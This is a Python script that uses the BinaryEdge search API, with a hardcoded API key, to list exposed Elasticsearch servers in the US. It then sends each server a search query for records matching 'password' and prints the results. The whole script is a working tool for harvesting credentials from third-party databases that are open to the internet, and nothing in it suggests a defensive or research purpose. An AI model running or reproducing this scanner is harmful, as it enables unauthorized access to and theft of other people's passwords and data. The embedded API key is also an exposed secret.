import requests
import json
import io
from pybinaryedge import BinaryEdge
import pandas as pd

### BINARYEDGE SEARCH
be = BinaryEdge('a68a0cb1-3c15-44e6-b79d-1ca7e7ea368d')
search = 'elasticsearch.docs:>50000 elasticsearch.size_in_bytes:<15000000000 country:"US"'

### ITERATE THROUGH BINARY EDGE RESULTS
flag = 0
count = 1
tracker = 1
ip_list = []
while flag == 0:
    results = be.host_search(search,page=count)
    if len(results['events'])!=20:
        flag = flag + 1
        break
    else:
        print(len(results['events']))
        count = count + 1
        for ip in results['events']:
            if tracker > 7:
                flag = flag + 1
                break
            else:
                requesting = ip['target']['ip'] + ":" + str(ip['target']['port'])
                ip_list.append(requesting)
                print(requesting)
        tracker = tracker + 1


### REQUESTS

for ip in ip_list:
    print("***REQUESTS***\n")
    #query = 'http://' + ip + '/_cat/indices?s=index&v'
    query = 'http://' + ip + '/_search?q=*password*&pretty'
    try:
        r = requests.get(query, timeout=20)
    except:
        continue
    print("test")

    try:
        json_object = r.json()
        # json.dumps(json_object, indent=2)
        print(ip)
        print(json.dumps(json_object, indent=2))
    except:
        continue

    #rawData2 = pd.read_csv(query)
    #print(rawData2[1:])
    sec = input('Let us wait for user input. Let me know how many seconds to sleep now.\n')

### PANDAS

#json_object=r.json()
#print(json.dumps(json_object, indent=2))
